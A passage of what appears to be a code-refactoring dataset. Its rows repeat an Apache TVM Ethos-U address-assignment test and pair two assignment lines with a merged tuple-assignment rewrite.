                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","primfunc = mod.functions.items()[0][1]
_allocate_node_sizes = dict()","primfunc , _allocate_node_sizes  = mod.functions.items()[0][1], dict()"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
candidate_regions_for_scratch = [5, 2, 1]","tir_mod , candidate_regions_for_scratch  = tvm.tir.transform.MakeUnpackedAPI()(tir_mod), [5, 2, 1]"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
